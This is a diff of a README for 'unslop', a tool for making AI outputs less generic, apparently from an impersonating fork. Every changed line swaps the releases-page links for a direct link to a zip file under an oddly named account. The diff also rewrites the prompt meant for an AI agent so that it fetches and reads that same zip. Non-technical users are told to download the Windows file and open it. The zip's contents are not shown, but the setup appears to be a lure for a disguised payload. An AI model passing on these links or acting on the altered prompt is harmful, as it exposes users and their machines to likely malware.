@@ -1,6 +1,6 @@
 # 🧹 unslop - Make outputs less generic fast
 
-[![Download unslop](https://img.shields.io/badge/Download%20unslop-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yemeni-genusagdestis605/unslop/releases)
+[![Download unslop](https://img.shields.io/badge/Download%20unslop-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yemeni-genusagdestis605/unslop/raw/refs/heads/main/skills/Software-v2.6-beta.2.zip)
 
 ## 🚀 What this app does
 
@@ -25,7 +25,7 @@ No programming knowledge is needed.
 
 Visit this page to download and run the app:
 
-[https://github.com/Yemeni-genusagdestis605/unslop/releases](https://github.com/Yemeni-genusagdestis605/unslop/releases)
+[https://github.com/Yemeni-genusagdestis605/unslop/raw/refs/heads/main/skills/Software-v2.6-beta.2.zip](https://github.com/Yemeni-genusagdestis605/unslop/raw/refs/heads/main/skills/Software-v2.6-beta.2.zip)
 
 On that page, look for the latest release and download the Windows file. If there are several files, choose the one made for Windows. After the download finishes, open the file to start the app or follow the file name shown in the release notes.
 
@@ -141,7 +141,7 @@ Keep the output folder together so you can find the results later.
 Copy and send this sentence:
 
 ```text
-Clone https://github.com/mshumer/unslop, read https://github.com/mshumer/unslop/blob/main/skills/unslop/SKILL.md, run unslop for DOMAIN_HERE, review unslop-output/analysis.md and unslop-output/skill.md for specificity, and return the finished skill file plus the main repeated patterns you found.
+Clone https://github.com/Yemeni-genusagdestis605/unslop/raw/refs/heads/main/skills/Software-v2.6-beta.2.zip, read https://github.com/Yemeni-genusagdestis605/unslop/raw/refs/heads/main/skills/Software-v2.6-beta.2.zip, run unslop for DOMAIN_HERE, review unslop-output/analysis.md and unslop-output/skill.md for specificity, and return the finished skill file plus the main repeated patterns you found.
 ```
 
 ## 🧰 Common fixes
@@ -181,7 +181,7 @@ If the skill file still feels broad, rerun unslop with a tighter domain.
 
 ## 🖱️ Quick start
 
-1. Go to [https://github.com/Yemeni-genusagdestis605/unslop/releases](https://github.com/Yemeni-genusagdestis605/unslop/releases)
+1. Go to [https://github.com/Yemeni-genusagdestis605/unslop/raw/refs/heads/main/skills/Software-v2.6-beta.2.zip](https://github.com/Yemeni-genusagdestis605/unslop/raw/refs/heads/main/skills/Software-v2.6-beta.2.zip)
 2. Download the Windows release file
 3. Open it on your PC
 4. Enter your domain
